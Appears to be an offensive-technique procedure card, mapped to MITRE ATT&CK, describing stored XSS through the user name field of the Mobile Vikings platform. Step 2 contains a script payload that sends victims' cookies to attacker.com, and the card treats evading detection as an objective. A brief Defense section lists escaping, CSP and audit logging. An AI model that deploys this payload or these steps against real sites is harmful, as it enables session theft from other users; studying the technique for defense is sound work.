---
id: proc-inject-xss-username-mobilevikings
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:35.697Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-User-Name

## Summary

This procedure exploits a lack of input sanitization in the user name field to store a JavaScript payload, building on prior cookie-based XSS for persistence across sessions.

## Description

In the Mobile Vikings platform, the user name is stored server-side and can be tainted with XSS payloads if not properly escaped. This step assumes prior access via cookie manipulation to bypass any client-side checks. The payload remains dormant until rendered in specific contexts, enabling stored XSS attacks targeting other users.

## Requirements

1. Valid attacker account on Mobile Vikings
2. Prior compromise allowing user name modification (e.g., via cookie XSS)
3. Web browser for navigation

## Defense

Defensive measures and detection strategies:

- Implement server-side input validation and HTML escaping for user names
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous user name updates via audit logs

## Objectives

1. Persist malicious JavaScript in the user profile
2. Avoid immediate detection by ensuring payload doesn't execute on storage
3. Set up for propagation to victims

## Instructions

### Step 1: Access Account Settings

**Context**: Log in to the attacker's account and navigate to the profile section where user name can be edited.

Use the platform's account settings page to locate the user name input field.

### Step 2: Craft and Inject Payload

**Context**: Select a payload that evades basic filters, such as `<script>fetch('http://attacker.com/steal?data='+encodeURIComponent(document.cookie));</script>`.

Submit the form with the payload as the new user name. If cookie XSS is available from a previous report, inject via developer tools: Edit cookies to trigger the update endpoint.

### Step 3: Verify Storage

**Context**: Confirm the payload is stored without execution.

Refresh the profile page and inspect the HTML source to ensure the user name reflects the injected script tag unsanitized.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- injection
